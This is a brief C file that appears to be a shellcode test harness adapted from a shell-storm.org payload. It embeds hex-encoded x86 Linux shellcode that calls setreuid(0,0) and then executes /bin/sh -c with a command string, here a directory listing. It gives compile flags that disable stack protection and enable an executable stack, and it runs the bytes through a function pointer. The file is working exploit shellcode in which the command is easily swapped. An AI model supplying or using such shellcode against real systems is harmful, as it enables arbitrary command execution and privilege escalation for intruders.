#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
// Author: Chase Hatch 
// modified:  http://shell-storm.org/shellcode/files/shellcode-216.php

char aspartame[]=\
"\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff"

"\x2f\x62\x69\x6e\x2f\x6c\x73\x20\x2d\x61\x6c\x20\x2e\x3b\x65\x78\x69\x74\x3b";
// gcc 216.c -o 216.elf -fno-stack-protector -z execstack
// cmd = /bin/ls -al .;exit;   // 19 bytes 
// execution stub: 49 bytes 
// 49 + 19  bytes total

 
int main(int argc, char **argv){
	printf("[#] len: %d\n", strlen(aspartame));
	(* (int (*)())aspartame)();
	exit(0);
}

